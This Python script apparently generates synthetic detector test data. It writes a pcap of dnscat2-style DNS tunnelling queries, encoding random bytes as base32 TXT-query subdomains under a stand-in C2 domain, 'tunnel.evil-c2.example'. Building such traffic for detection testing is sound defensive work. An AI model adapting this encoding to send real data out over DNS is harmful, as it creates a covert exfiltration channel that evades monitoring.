"""PS class (c) generator part 2: dnscat2-style DNS tunnelling (TXT queries).

Encodes random payload bytes as base32 subdomain labels under an authoritative
domain — long QNAMEs, high label entropy, TXT-heavy: exactly what the tunnel
detector keys on.
"""

from __future__ import annotations

import argparse
import base64
import os
import random
import time

from scapy.all import DNS, DNSQR, IP, UDP, Ether, wrpcap


def encode_chunk(data: bytes) -> str:
    return base64.b32encode(data).decode().rstrip("=").lower()


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--src", default="10.200.0.70")
    p.add_argument("--resolver", default="10.200.0.1")
    p.add_argument("--domain", default="tunnel.evil-c2.example")
    p.add_argument("--queries", type=int, default=60)
    p.add_argument("--chunk-bytes", type=int, default=24)
    p.add_argument("--interval-s", type=float, default=0.5)
    p.add_argument("--out", default="datasets/dns_tunneling.pcap")
    a = p.parse_args()

    rng = random.Random()
    session_id = os.urandom(4).hex()
    pkts = []
    t = time.time()
    for seq in range(a.queries):
        payload = os.urandom(a.chunk_bytes)
        labels = [encode_chunk(payload[i:i + 15]) for i in range(0, len(payload), 15)]
        qname = ".".join([f"{session_id}{seq:04x}", *labels, a.domain])
        t += rng.uniform(a.interval_s * 0.5, a.interval_s * 1.5)
        pkt = Ether() / IP(src=a.src, dst=a.resolver) / \
            UDP(sport=rng.randint(30000, 60000), dport=53) / \
            DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
        pkt.time = t
        pkts.append(pkt)
    wrpcap(a.out, pkts)
    print(f"wrote {len(pkts)} tunnelling queries -> {a.out}")


if __name__ == "__main__":
    main()
